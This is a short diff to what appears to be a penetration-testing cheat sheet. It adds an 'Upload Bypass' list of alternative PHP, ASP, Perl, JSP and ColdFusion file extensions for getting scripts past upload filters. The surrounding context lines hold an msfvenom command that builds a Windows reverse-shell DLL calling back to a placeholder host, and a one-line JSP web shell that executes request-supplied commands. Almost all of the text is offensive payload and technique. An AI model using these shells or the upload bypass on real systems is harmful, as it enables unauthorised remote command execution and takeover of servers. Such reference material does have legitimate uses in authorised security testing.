@@ -70,6 +70,22 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 
+## Upload Bypass
+
+### Rename the extension 
+```
+PHP: phtml, .php, .php3, .php4, .php5, and .inc
+
+ASP: asp, .aspx
+
+PERL: .pl, .pm, .cgi, .lib
+
+JSP: .jsp, .jspx, .jsw, .jsv, and .jspf
+
+Coldfusion: .cfm, .cfml, .cfc, .dbm
+```
+
+
 ## Shell Stabilisation
 
 #### Technique 01: Python
